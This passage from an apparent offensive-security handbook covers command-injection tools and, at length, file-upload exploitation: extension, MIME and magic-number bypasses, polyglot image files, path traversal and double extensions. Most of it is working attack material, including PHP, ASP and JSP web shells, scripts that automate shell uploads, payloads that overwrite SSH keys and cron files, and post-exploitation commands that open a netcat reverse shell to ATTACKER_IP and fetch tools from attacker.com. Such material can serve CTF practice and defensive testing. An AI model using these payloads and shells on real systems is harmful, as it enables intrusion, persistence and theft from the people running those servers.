python commix.py --url="https://target.com/ping?ip=INJECT_HERE" \
  --file-upload="/path/to/shell.php"
```

### TplMap (SSTI Scanner)

```bash
# Install
git clone https://github.com/epinna/tplmap.git
cd tplmap

# Scan for SSTI
python tplmap.py -u "https://target.com/page?name=test"

# Scan POST parameter
python tplmap.py -u "https://target.com/profile" \
  --data="bio=test"

# Get OS shell
python tplmap.py -u "https://target.com/page?name=test" \
  --os-shell

# Execute single command
python tplmap.py -u "https://target.com/page?name=test" \
  --os-cmd "id"

# Upload file
python tplmap.py -u "https://target.com/page?name=test" \
  --upload="/path/to/shell.php" \
  --upload-dest="/var/www/html/shell.php"
```

## Important Related Topics

For comprehensive command injection and code execution exploitation:

- **SUID Binary Exploitation** - Privilege escalation through misconfigured binaries
- **Path Traversal to RCE** - Combining file inclusion vulnerabilities with code execution
- **Deserialization Vulnerabilities** - Beyond PHP, including Java, .NET, Python, Ruby
- **Server-Side Request Forgery (SSRF) to RCE** - Chaining SSRF with internal services
- **Container Escape Techniques** - Breaking out of Docker/containerized environments after initial code execution

---

# File Upload Vulnerabilities

## File Upload Mechanisms

File upload functionality allows users to submit files to web applications for storage and processing. Vulnerabilities occur when applications fail to properly validate, sanitize, or restrict uploaded files, potentially leading to remote code execution (RCE), stored XSS, path traversal, or denial of service.

**Common Upload Implementation Methods**

HTML form-based uploads:

```html
<!-- Basic file upload form -->
<form method="POST" enctype="multipart/form-data" action="/upload">
    <input type="file" name="uploadfile">
    <input type="submit" value="Upload">
</form>
```

Multiple file uploads:

```html
<input type="file" name="files[]" multiple>
```

AJAX/JavaScript uploads:

```javascript
// XMLHttpRequest upload
var formData = new FormData();
formData.append('file', fileInput.files[0]);

var xhr = new XMLHttpRequest();
xhr.open('POST', '/upload', true);
xhr.send(formData);

// Fetch API upload
fetch('/upload', {
    method: 'POST',
    body: formData
});
```

**Server-Side Upload Handling Patterns**

PHP upload handling:

```php
<?php
// Common PHP upload structure
if(isset($_FILES['uploadfile'])) {
    $filename = $_FILES['uploadfile']['name'];
    $tmp_name = $_FILES['uploadfile']['tmp_name'];
    $size = $_FILES['uploadfile']['size'];
    $type = $_FILES['uploadfile']['type'];
    
    move_uploaded_file($tmp_name, "uploads/" . $filename);
}
?>
```

**Upload Vulnerability Testing Workflow**

1. Identify upload functionality:

```bash
# Map upload endpoints
burpsuite
# Browse application and identify file upload forms

# Check for upload directories
dirb http://target.com /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# Common upload directories
/uploads/
/files/
/images/
/media/
/documents/
/assets/
/public/
/static/
```

2. Analyze client-side validation:

```javascript
// View page source for JavaScript validation
// Disable JavaScript in browser
// Modify form attributes using browser console
document.querySelector('input[type="file"]').removeAttribute('accept');
```

3. Intercept upload request with Burp Suite:

```bash
# Configure proxy: 127.0.0.1:8080
# Enable intercept
# Submit test file
# Modify Content-Type, filename, extension in intercepted request
```

**Basic File Upload Testing**

Test with legitimate file first:

```bash
# Create test image
convert -size 100x100 xc:white test.jpg

# Upload via curl
curl -F "file=@test.jpg" http://target.com/upload

# Check response for upload path/URL
```

Test web shell upload:

```bash
# Create PHP web shell
cat > shell.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF

# Attempt direct upload
curl -F "file=@shell.php" http://target.com/upload

# Access uploaded shell
curl "http://target.com/uploads/shell.php?cmd=id"
```

**Automated Upload Vulnerability Scanning**

```bash
# fuxploider - File upload vulnerability scanner
git clone https://github.com/almandin/fuxploider.git
cd fuxploider
pip3 install -r requirements.txt

python3 fuxploider.py --url http://target.com/upload \
  --input file \
  --not-regex "error|invalid"

# Upload Scanner Burp Extension
# Install via BApp Store in Burp Suite
```

**Common Validation Mechanisms to Bypass**

Client-side validation only:

- JavaScript file type checking
- HTML5 accept attribute restrictions
- File size limits in JavaScript

Server-side validation types:

- Extension blacklist/whitelist
- MIME type validation
- File content inspection
- Magic number verification
- File size restrictions
- Filename sanitization

**Identifying Validation Type**

Test sequence to identify validation:

```bash
# 1. Upload .php directly
# 2. Upload .jpg (legitimate)
# 3. Upload .php with image content
# 4. Upload .jpg with PHP content
# 5. Upload with double extension
# 6. Upload with null byte injection
```

**Path Traversal in File Uploads**

Test directory traversal in filename:

```bash
# Basic traversal
curl -F "file=@shell.php" http://target.com/upload \
  -F "filename=../../../shell.php"

# Using Burp Suite, modify filename parameter:
Content-Disposition: form-data; name="file"; filename="../../../var/www/html/shell.php"

# URL encoding
filename=..%2f..%2f..%2fshell.php

# Windows traversal
filename=..\..\..\..\inetpub\wwwroot\shell.asp
```

**Race Condition Upload Exploits** [Inference]

Some applications validate files after upload then delete if invalid:

```bash
# Terminal 1 - Continuous upload
while true; do
    curl -F "file=@shell.php" http://target.com/upload
done

# Terminal 2 - Attempt to access before deletion
while true; do
    curl http://target.com/uploads/shell.php?cmd=id
done
```

**File Upload Fuzzing with Burp Intruder**

Setup Intruder attack:

1. Intercept upload request in Burp
2. Send to Intruder (Ctrl+I)
3. Mark filename and extension as payload positions
4. Load extension payloads from SecLists:

```bash
# Extension fuzzing wordlist
/usr/share/seclists/Fuzzing/extensions-most-common.fuzz.txt

# Upload bypass extensions
php, php3, php4, php5, phtml, pht, phps
asp, aspx, cer, asa
jsp, jspx
cgi, pl
py
sh
```

## Extension Validation Bypass

Extension-based validation is one of the most common upload security mechanisms. Servers check file extensions against blacklists (blocked extensions) or whitelists (allowed extensions).

**Blacklist Bypass Techniques**

Case manipulation:

```bash
# Test case variations
shell.pHp
shell.PhP
shell.PHP
shell.Php

# Upload using curl
curl -F "file=@shell.pHp" http://target.com/upload
```

Double extensions:

```bash
# Combine allowed and blocked extensions
shell.jpg.php
shell.php.jpg
config.txt.php

# Some servers process last extension, others process first
```

Null byte injection (legacy PHP < 5.3.4):

```bash
# Create file with null byte in filename
# Null byte (%00) truncates string in C-based functions

# Using Burp Suite, modify filename:
filename="shell.php%00.jpg"

# Server stores as shell.php (truncated at null byte)
# But validation sees .jpg extension
```

Alternative PHP extensions:

```bash
# Test all PHP executable extensions
shell.php3
shell.php4
shell.php5
shell.php7
shell.pht
shell.phtml
shell.phps
shell.phar
shell.phpt

# PHP configuration may allow these extensions
```

Less common web shell extensions:

```bash
# ASP/ASPX (Windows IIS)
shell.asp
shell.aspx
shell.cer
shell.asa
shell.cdx

# JSP (Java)
shell.jsp
shell.jspx
shell.jsw
shell.jsv
shell.jspf

# Perl/CGI
shell.cgi
shell.pl

# Python
shell.py

# Server-Side Includes
shell.shtml
shell.shtm
shell.stm
```

**Whitelist Bypass Techniques**

Adding allowed extension to malicious file:

```bash
# If .jpg is whitelisted
shell.php.jpg

# Server may execute based on first extension
# Or parse based on Content-Type
```

htaccess upload to enable execution:

```bash
# Create .htaccess file
cat > .htaccess << 'EOF'
AddType application/x-httpd-php .jpg
AddHandler application/x-httpd-php .jpg
EOF

# Upload .htaccess first
curl -F "file=@.htaccess" http://target.com/upload

# Then upload PHP code with .jpg extension
cat > shell.jpg << 'EOF'
<?php system($_GET['cmd']); ?>
EOF

curl -F "file=@shell.jpg" http://target.com/upload

# Access: http://target.com/uploads/shell.jpg?cmd=id
```

web.config upload (Windows IIS):

```xml
<!-- web.config -->
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <handlers>
            <add name="PHP_via_FastCGI" 
                 path="*.jpg" 
                 verb="*" 
                 modules="FastCgiModule" 
                 scriptProcessor="C:\PHP\php-cgi.exe" 
                 resourceType="Unspecified" 
                 requireAccess="Script" />
        </handlers>
    </system.webServer>
</configuration>
```

Polyglot files (valid as multiple types):

```bash
# Create image containing PHP code
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg

# Some servers may execute embedded code
# Works when server checks image validity but executes content
```

**Case Study: Extension Bypass Chain**

Test methodology:

```bash
# 1. Direct upload
curl -F "file=@shell.php" http://target.com/upload
# Result: Blocked

# 2. Case variation
curl -F "file=@shell.PHP" http://target.com/upload
# Result: Blocked

# 3. Double extension
curl -F "file=@shell.php.jpg" http://target.com/upload
# Result: Accepted, but not executed

# 4. Reverse double extension
curl -F "file=@shell.jpg.php" http://target.com/upload
# Result: Blocked

# 5. Alternative extension
curl -F "file=@shell.phtml" http://target.com/upload
# Result: Accepted and executed! âœ“
```

**Apache mod_mime Multiple Extensions**

Apache processes extensions right-to-left until it finds handler:

```bash
# These may all execute as PHP:
shell.php.jpg.test.fake
shell.jpg.php.png
shell.test.php.bak

# Upload with multiple extensions
curl -F "file=@shell.test.php.jpg" http://target.com/upload
```

**Testing with Burp Suite Intruder**

Configure extension fuzzing attack:

```
1. Intercept upload request
2. Send to Intruder
3. Set payload position: filename="shell.Â§phpÂ§"
4. Attack type: Sniper
5. Payload: Simple list
6. Add extensions:
   php
   php3
   php4
   php5
   phtml
   pht
   (etc.)
7. Start attack
8. Analyze responses for differences
```

**Automated Extension Testing**

```bash
# Create extension test script
cat > test_extensions.sh << 'EOF'
#!/bin/bash
TARGET="http://target.com/upload"
SHELL_CONTENT='<?php system($_GET["cmd"]); ?>'

extensions=(php php3 php4 php5 phtml pht phps php7 phar)

for ext in "${extensions[@]}"; do
    echo "$SHELL_CONTENT" > "shell.$ext"
    echo "[*] Testing: shell.$ext"
    
    response=$(curl -s -F "file=@shell.$ext" "$TARGET")
    
    if echo "$response" | grep -qi "success\|uploaded"; then
        echo "[+] Accepted: shell.$ext"
    else
        echo "[-] Rejected: shell.$ext"
    fi
    
    rm "shell.$ext"
done
EOF

chmod +x test_extensions.sh
./test_extensions.sh
```

## MIME Type Spoofing

MIME (Multipurpose Internet Mail Extensions) type validation checks the Content-Type header in the HTTP request. This validation can be bypassed because Content-Type is client-controlled.

**Understanding MIME Types**

Common MIME types:

```
Images:
- image/jpeg
- image/png
- image/gif
- image/svg+xml

Documents:
- application/pdf
- application/msword
- application/vnd.openxmlformats-officedocument.wordprocessingml.document

Executables:
- application/x-php
- application/x-httpd-php
- text/php
- application/octet-stream

Text:
- text/plain
- text/html
- text/javascript
```

**Intercepting and Modifying MIME Type**

Using Burp Suite:

```http
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

Change Content-Type to bypass validation:

```http
Content-Type: image/jpeg
```

Using curl with custom Content-Type:

```bash
# Default upload (will send application/x-php)
curl -F "file=@shell.php" http://target.com/upload

# Force specific MIME type
curl -F "file=@shell.php;type=image/jpeg" http://target.com/upload

# Alternative syntax
curl -F "file=@shell.php;filename=shell.php;type=image/png" http://target.com/upload
```

**MIME Type Bypass Strategies**

Strategy 1 - Whitelist bypass:

```bash
# If server only checks Content-Type header
# Upload PHP shell with image MIME type

# Create shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload with image MIME type
curl -F "file=@shell.php;type=image/jpeg" http://target.com/upload

# Access uploaded shell
curl "http://target.com/uploads/shell.php?cmd=whoami"
```

Strategy 2 - PHP GIF header bypass:

```bash
# Add GIF89a magic bytes to satisfy both MIME and magic number checks
cat > shell.php << 'EOF'
GIF89a
<?php system($_GET['cmd']); ?>
EOF

# Upload with GIF MIME type
curl -F "file=@shell.php;type=image/gif" http://target.com/upload
```

Strategy 3 - Image with embedded code:

```bash
# Create valid JPEG with PHP code in EXIF
echo '<?php system($_GET["cmd"]); ?>' > payload.txt
cat payload.txt >> image.jpg

# Or use exiftool
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.php.jpg

# Upload with image MIME type
curl -F "file=@shell.php.jpg;type=image/jpeg" http://target.com/upload
```

**Server-Side MIME Detection** [Inference]

Servers may detect MIME type using:

1. Content-Type header (client-controlled)
2. File extension mapping
3. File content inspection (libmagic/file command)
4. Image processing libraries (GD, ImageMagick)

**Testing MIME Type Validation**

Test matrix:

```bash
# Test 1: PHP file with PHP MIME type
curl -F "file=@shell.php;type=application/x-php" http://target.com/upload

# Test 2: PHP file with image MIME type
curl -F "file=@shell.php;type=image/jpeg" http://target.com/upload

# Test 3: PHP file with text MIME type
curl -F "file=@shell.php;type=text/plain" http://target.com/upload

# Test 4: Image extension with PHP MIME type
curl -F "file=@shell.jpg;type=application/x-php" http://target.com/upload

# Test 5: Image extension with image MIME type, PHP content
echo '<?php system($_GET["cmd"]); ?>' > shell.jpg
curl -F "file=@shell.jpg;type=image/jpeg" http://target.com/upload
```

**MIME Type Fuzzing**

```bash
# Create MIME type fuzzing script
cat > mime_fuzz.sh << 'EOF'
#!/bin/bash
TARGET="http://target.com/upload"

mime_types=(
    "image/jpeg"
    "image/png"
    "image/gif"
    "image/svg+xml"
    "application/octet-stream"
    "text/plain"
    "text/html"
    "application/x-php"
    "application/pdf"
    "multipart/form-data"
)

for mime in "${mime_types[@]}"; do
    echo "[*] Testing MIME type: $mime"
    response=$(curl -s -F "file=@shell.php;type=$mime" "$TARGET")
    
    if echo "$response" | grep -qi "success\|uploaded"; then
        echo "[+] Accepted with MIME type: $mime"
    fi
done
EOF

chmod +x mime_fuzz.sh
./mime_fuzz.sh
```

**Content-Type Manipulation Techniques**

Empty Content-Type:

```http
Content-Type: 
```

Invalid Content-Type:

```http
Content-Type: invalid/type
Content-Type: ../../../etc/passwd
Content-Type: <script>alert(1)</script>
```

Multiple Content-Type headers [Inference]:

```http
Content-Type: image/jpeg
Content-Type: application/x-php
```

**SVG File Upload for XSS**

SVG files support embedded JavaScript:

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(0,0,255);"/>
   <script type="text/javascript">
      alert(document.domain);
   </script>
</svg>
```

Upload SVG:

```bash
# Save as shell.svg
curl -F "file=@shell.svg;type=image/svg+xml" http://target.com/upload

# When viewed in browser, JavaScript executes
# Can lead to stored XSS
```

**PDF Upload for XSS/Code Execution** [Inference]

PDF files can contain JavaScript:

```bash
# Create malicious PDF with embedded JavaScript
pdftk input.pdf output output.pdf compress

# Manually edit PDF to add JavaScript
# /AA <</O <</S /JavaScript /JS (app.alert('XSS'))>>>>
```

## Magic Number Bypass

Magic numbers (file signatures) are specific byte sequences at the beginning of files that identify file formats. Servers use magic number validation to verify actual file content regardless of extension or MIME type.

**Common File Signatures**

```
JPEG: FF D8 FF E0 (or FF D8 FF E1)
PNG:  89 50 4E 47 0D 0A 1A 0A
GIF:  47 49 46 38 39 61 (GIF89a) or 47 49 46 38 37 61 (GIF87a)
PDF:  25 50 44 46 (%PDF)
ZIP:  50 4B 03 04 or 50 4B 05 06
RAR:  52 61 72 21 (Rar!)
ELF:  7F 45 4C 46
PE:   4D 5A (MZ)
BMP:  42 4D (BM)
```

**Verifying File Signatures**

Using hexdump:

```bash
# View first 20 bytes of file in hex
hexdump -n 20 -C file.jpg

# Output example:
# 00000000  ff d8 ff e0 00 10 4a 46  49 46 00 01 01 00 00 01  |......JFIF......|

# View with xxd
xxd -l 20 file.jpg
```

Using file command:

```bash
# Identify file type by magic number
file shell.php
# Output: shell.php: PHP script, ASCII text

file image.jpg
# Output: image.jpg: JPEG image data, JFIF standard 1.01
```

**Creating Polyglot Files**

Polyglot files are valid in multiple formats simultaneously.

PHP + GIF polyglot:

```bash
# Create file with GIF magic bytes + PHP code
cat > shell.php << 'EOF'
GIF89a
<?php system($_GET['cmd']); ?>
EOF

# Verify both formats recognized
file shell.php
# Output: GIF image data, version 89a, 0 x 0

# Upload and execute
curl -F "file=@shell.php;type=image/gif" http://target.com/upload
curl "http://target.com/uploads/shell.php?cmd=id"
```

PHP + JPEG polyglot:

```bash
# Create valid JPEG with PHP code appended
cat image.jpg > shell.php.jpg
echo '<?php system($_GET["cmd"]); ?>' >> shell.php.jpg

# Or prepend PHP to JPEG
cat > shell.php.jpg << 'EOF'
<?php system($_GET['cmd']); __halt_compiler();
EOF
cat image.jpg >> shell.php.jpg

# Upload with image MIME type
curl -F "file=@shell.php.jpg;type=image/jpeg" http://target.com/upload
```

PHP + PNG polyglot:

```bash
# PNG magic bytes: \x89PNG\r\n\x1a\n
printf '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > shell.php

# More sophisticated: Embed in PNG chunk
# Use tools like PNGOUT or custom scripts
```

**Using Image Processing Tools**

exiftool for embedding code in metadata:

```bash
# Install exiftool
apt-get install libimage-exiftool-perl

# Add PHP code to JPEG comment
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.php.jpg

# Add to EXIF fields
exiftool -Artist='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.php.jpg

# View embedded data
exiftool shell.php.jpg | grep -i comment
```

ImageMagick for creating malicious images:

```bash
# Create image with text overlay containing code
convert -size 200x100 xc:white -pointsize 8 \
  -annotate +10+50 '<?php system($_GET["cmd"]); ?>' \
  shell.jpg

# Note: This embeds visually, may not execute
```

**GIF + PHP Polyglot (Detailed)**

```bash
# Manual creation
printf 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif

# Verify magic number
xxd -l 6 shell.gif
# Output: 00000000: 4749 4638 3961            GIF89a

# File type detection
file shell.gif
# Output: GIF image data, version 89a

# Upload
curl -F "file=@shell.gif;type=image/gif" http://target.com/upload

# Execute
curl "http://target.com/uploads/shell.gif?cmd=whoami"
```

**ZIP-based Polyglots** [Inference]

JAR/WAR files for Java applications:

```bash
# Create minimal WAR file with JSP shell
mkdir -p WEB-INF
cat > shell.jsp << 'EOF'
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    Process p = Runtime.getRuntime().exec(cmd);
    InputStream in = p.getInputStream();
    int c;
    while((c = in.read()) != -1) {
        out.print((char)c);
    }
%>
EOF

# Create WAR archive
jar -cvf shell.war shell.jsp WEB-INF

# Upload as image with ZIP magic bytes
curl -F "file=@shell.war;type=application/zip" http://target.com/upload
```

**Automated Polyglot Generation**

```bash
# Create automated polyglot generator script
cat > create_polyglot.sh << 'EOF'
#!/bin/bash

if [ $# -ne 3 ]; then
    echo "Usage: $0 <format> <image> <payload>"
    echo "Formats: gif, jpg, png"
    exit 1
fi

FORMAT=$1
IMAGE=$2
PAYLOAD=$3

case $FORMAT in
    gif)
        printf 'GIF89a' > polyglot.gif
        cat "$PAYLOAD" >> polyglot.gif
        cat "$IMAGE" >> polyglot.gif
        echo "[+] Created polyglot.gif"
        ;;
    jpg)
        cat "$IMAGE" > polyglot.php.jpg
        cat "$PAYLOAD" >> polyglot.php.jpg
        echo "[+] Created polyglot.php.jpg"
        ;;
    png)
        printf '\x89PNG\r\n\x1a\n' > polyglot.php.png
        cat "$PAYLOAD" >> polyglot.php.png
        tail -c +9 "$IMAGE" >> polyglot.php.png
        echo "[+] Created polyglot.php.png"
        ;;
esac
EOF

chmod +x create_polyglot.sh

# Usage
echo '<?php system($_GET["cmd"]); ?>' > payload.php
./create_polyglot.sh gif image.gif payload.php
```

**Testing Magic Number Validation**

Test sequence:

```bash
# 1. Upload pure PHP (should be rejected if magic number checked)
curl -F "file=@shell.php" http://target.com/upload

# 2. Upload with GIF magic bytes
printf 'GIF89a<?php system($_GET["cmd"]); ?>' > test.php
curl -F "file=@test.php;type=image/gif" http://target.com/upload

# 3. Check if file was accepted and is executable
curl "http://target.com/uploads/test.php?cmd=id"

# 4. If rejected, try full polyglot with valid image structure
```

**Image Library Processing Bypass** [Inference]

Some applications reprocess images, which may remove injected code:

```bash
# Test if image is reprocessed
md5sum original.jpg
# Upload original.jpg
md5sum downloaded.jpg

# If hashes differ, image was reprocessed
# May need to exploit image processing library vulnerabilities
```

ImageMagick exploits (CVE-2016-3714, ImageTragick):

```bash
# Create malicious ImageMagick file
cat > exploit.mvg << 'EOF'
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|ls -la")'
pop graphic-context
EOF

# Upload and trigger processing
curl -F "file=@exploit.mvg" http://target.com/upload
```

**PHP Wrappers for Filter Bypass** [Inference]

```bash
# Using PHP filters in filename
filename="php://filter/convert.base64-encode/resource=shell.php"

# Using data wrapper
filename="data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"
# Base64 decodes to: <?php system($_GET['cmd']); ?>
```

**Building Complete Web Shells**

Full-featured PHP shell after bypass:

```php
<?php
// Minimal web shell
system($_GET['cmd']);

// Feature-rich shell
if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "<pre>";
    
    // Try multiple execution methods
    if(function_exists('system')) {
        system($cmd);
    } elseif(function_exists('shell_exec')) {
        echo shell_exec($cmd);
    } elseif(function_exists('exec')) {
        exec($cmd, $output);
        echo implode("\n", $output);
    } elseif(function_exists('passthru')) {
        passthru($cmd);
    }
    
    echo "</pre>";
}
?>
```

ASP web shell:

```asp
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
szCMD = Request.QueryString("cmd")
Set oExec = oScript.Exec("cmd /c " & szCMD)
Response.Write(oExec.StdOut.ReadAll())
%>
```

JSP web shell:

```jsp
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(cmd);
BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
String line;
while((line = br.readLine()) != null) {
    out.println(line + "<br>");
}
%>
```

**Post-Exploitation After Upload**

Once shell is uploaded:

```bash
# Basic command execution
curl "http://target.com/uploads/shell.php?cmd=whoami"

# Enumerate system
curl "http://target.com/uploads/shell.php?cmd=uname+-a"
curl "http://target.com/uploads/shell.php?cmd=cat+/etc/passwd"

# Establish reverse shell
curl "http://target.com/uploads/shell.php?cmd=nc+-e+/bin/bash+ATTACKER_IP+4444"

# Download additional tools
curl "http://target.com/uploads/shell.php?cmd=wget+http://attacker.com/tool+-O+/tmp/tool"
```

**Critical Testing Recommendations**

When testing file upload vulnerabilities in CTF environments:

1. **Always test in this order**: extension bypass â†’ MIME type bypass â†’ magic number bypass
2. **Use Burp Suite to intercept and modify**: filename, Content-Type, file content
3. **Test multiple bypass techniques combined**: GIF magic bytes + .php extension + image MIME type
4. **Check upload directory permissions**: may need directory traversal to reach executable location
5. **Monitor server responses**: error messages reveal validation logic
6. **Try configuration file uploads**: .htaccess, web.config, .user.ini
7. **Test file inclusion after upload**: LFI/RFI vulnerabilities may execute uploaded files
8. **Consider ZIP upload and extraction**: may allow path traversal via crafted archive

---

## Polyglot Files

Polyglot files are crafted to be valid in multiple file formats simultaneously, bypassing content-type validation while maintaining malicious functionality.

**Polyglot Mechanics:**

Files contain valid headers/structures for multiple formats. Parsers read different parts as valid content, allowing:

- Bypass of magic byte validation (file signature checks)
- Execution as code despite appearing as images/documents
- Content smuggling through security filters

**Common Polyglot Combinations:**

**1. Image + PHP:**

```bash
# GIF + PHP polyglot
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.php

# Explanation:
# GIF89a = Valid GIF header (magic bytes)
# PHP code executes when accessed as .php

# Upload as shell.php or shell.gif (depending on validation)
```

**PNG + PHP:**

```bash
# Create valid PNG with embedded PHP
echo -e '\x89\x50\x4e\x47\x0d\x0a\x1a\x0a<?php system($_GET["cmd"]); ?>' > shell.php

# \x89PNG = PNG signature
# Followed by PHP code
```

**JPEG + PHP:**

```bash
# JPEG starts with FF D8 FF
printf '\xff\xd8\xff\xe0<?php system($_GET["cmd"]); ?>' > shell.php

# Or use exiftool to embed in metadata
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.php
```

**2. PDF + JavaScript:**

```javascript
// PDF with embedded JavaScript
%PDF-1.4
1 0 obj

/Type /Catalog
/Pages 2 0 R
/OpenAction << /S /JavaScript /JS (app.alert('XSS');) >>
>>
endobj
```

**3. ZIP + Script Polyglots:**

```bash
# ZIP starts with PK (50 4B)
# Prepend script code that's ignored by ZIP parsers
echo '#!/bin/bash' > payload
echo 'echo "Malicious code"' >> payload
cat payload.zip >> payload
mv payload payload.zip

# ZIP readers skip shebang, shell executes if permissions set
```

**Creating Polyglots with Tools:**

**Exiftool (metadata injection):**

```bash
# Embed PHP in JPEG EXIF data
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg

# Verify metadata
exiftool image.jpg | grep Comment

# If application displays EXIF without sanitization â†’ XSS
# If file executed as PHP â†’ RCE
```

**ImageTragick (CVE-2016-3714):**

```bash
# Create malicious ImageMagick file
cat > exploit.mvg <<EOF
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|whoami > /tmp/output")'
pop graphic-context
EOF

# When processed by ImageMagick â†’ command execution
```

**GIF + JavaScript polyglot:**

```html
GIF89a/*<?php system($_GET["cmd"]); ?>*/=1;
<script>alert('XSS')</script>

<!-- Valid GIF header
     PHP code in comment
     JavaScript executes in browser if served with wrong MIME -->
```

**Testing Polyglot Effectiveness:**

```bash
# 1. Upload polyglot file
curl -X POST http://target.com/upload \
  -F "file=@shell.php" \
  -H "Cookie: session=xyz"

# 2. Access uploaded file
curl http://target.com/uploads/shell.php?cmd=whoami

# 3. Check if PHP executed or served as image
# Look for command output vs. image rendering
```

**Burp Suite Testing:**

- Upload polyglot via Repeater
- Modify `Content-Type` header: `image/gif`, `image/jpeg`, `application/octet-stream`
- Access uploaded file path
- Check response for code execution vs. file download

---

## Path Traversal via Uploads

Path traversal in file uploads allows attackers to write files outside intended upload directories, potentially overwriting critical files or placing shells in web-accessible locations.

**Attack Vectors:**

**1. Filename Manipulation:**

```bash
# Basic traversal
filename="../../../var/www/html/shell.php"

# Encoded variations
filename="..%2F..%2F..%2Fvar%2Fwww%2Fhtml%2Fshell.php"

# Double encoding
filename="..%252F..%252F..%252Fvar%252Fwww%252Fhtml%252Fshell.php"

# URL encoding only slashes
filename="..%2f..%2f..%2fvar%2fwww%2fhtml%2fshell.php"
```

**2. Absolute Path Injection:**

```bash
# If application doesn't validate absolute paths
filename="/var/www/html/shell.php"
filename="/etc/cron.d/malicious"
filename="/home/user/.ssh/authorized_keys"
```

**3. Windows-Specific Traversal:**

```bash
# Backslash traversal
filename="..\..\..\inetpub\wwwroot\shell.aspx"

# Forward slash (Windows accepts both)
filename="../../../inetpub/wwwroot/shell.aspx"

# UNC path injection
filename="\\attacker.com\share\file.txt"  # [Inference: May trigger SMB connection]
```

**4. Overwrite Critical Files:**

```bash
# SSH authorized_keys
filename="../../.ssh/authorized_keys"
# Content: attacker's public key

# Cron jobs
filename="../../../etc/cron.d/backdoor"
# Content: * * * * * root /tmp/shell.sh

# Web config
filename="../../.htaccess"
# Content: AddType application/x-httpd-php .txt

# Application config
filename="../../../config/database.yml"
# Content: Modified database credentials
```

**Testing Path Traversal:**

**Manual Testing:**

```bash
# Intercept upload request in Burp
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="../../../var/www/html/test.php"
Content-Type: application/octet-stream

<?php phpinfo(); ?>
------WebKitFormBoundary--

# Then access: http://target.com/test.php
```

**Automated with curl:**

```bash
# Upload with traversal filename
curl -X POST http://target.com/upload \
  -F "file=@shell.php;filename=../../../var/www/html/pwn.php" \
  -H "Cookie: session=xyz"

# Verify upload
curl http://target.com/pwn.php
```

**Detection Techniques:**

```bash
# 1. Upload test file with traversal
filename="../../test_$(date +%s).txt"

# 2. Check common web directories
curl http://target.com/test_<timestamp>.txt
curl http://target.com/../test_<timestamp>.txt
curl http://target.com/uploads/../../test_<timestamp>.txt

# 3. Error messages may reveal path
# Look for errors like: "Cannot write to /var/www/html/../../etc/passwd"
```

**Bypass Techniques:**

**Filter Evasion:**

```bash
# If ../ is filtered
....//  â†’ After removing ../ once: ../
..;/    â†’ Semicolon may be stripped
..\     â†’ Backslash variant

# Nested encoding
..%252F  â†’ ..%2F â†’ ../

# Unicode/UTF-8 encoding
..%c0%af  â†’ ../ (overlong encoding)
..%e0%80%af  â†’ ../ (overlong encoding)

# [Unverified: Unicode normalization may affect these encodings depending on application framework]
```

**NULL byte truncation (legacy PHP < 5.3.4):**

```bash
filename="../../../var/www/html/shell.php%00.jpg"
# Application checks .jpg extension
# PHP truncates at NULL byte, saves as shell.php
```

---

## Double Extension Attacks

Double extensions exploit weak validation that only checks final extension or incorrect MIME type handling.

**Attack Patterns:**

**1. Extension Confusion:**

```bash
# If validation checks last extension only
filename="shell.php.jpg"   # Parsed as .jpg, executed as .php
filename="shell.php.png"
filename="shell.php.gif"

# If validation checks first extension
filename="shell.jpg.php"   # Parsed as .jpg, executed as .php
```

**2. Apache mod_mime Exploitation:**

Apache processes extensions right-to-left until it finds a recognized handler.

```bash
# Apache configuration
AddHandler application/x-httpd-php .php

# Exploitation
filename="shell.php.jpg"
# Apache sees .jpg (not in handler list)
# Moves left, sees .php â†’ executes as PHP

# Multiple extensions
filename="shell.php.test.jpg"
# Still executed as PHP
```

**3. Case Manipulation:**

```bash
# If blacklist is case-sensitive
filename="shell.PHP"
filename="shell.PhP"
filename="shell.pHp"

# Mixed with double extension
filename="shell.PHP.jpg"
filename="shell.pHp.png"
```

**4. Null Byte in Extension:**

```bash
# Legacy vulnerability (PHP < 5.3.4)
filename="shell.php%00.jpg"
# Validation sees .jpg
# Server saves as shell.php (truncates at null)
```

**5. Alternate Executable Extensions:**

```bash
# PHP
.php, .php3, .php4, .php5, .php7, .phtml, .phar

# ASP/ASPX
.asp, .aspx, .cer, .asa, .ashx, .asmx

# JSP
.jsp, .jspx, .jsw, .jsv, .jspf

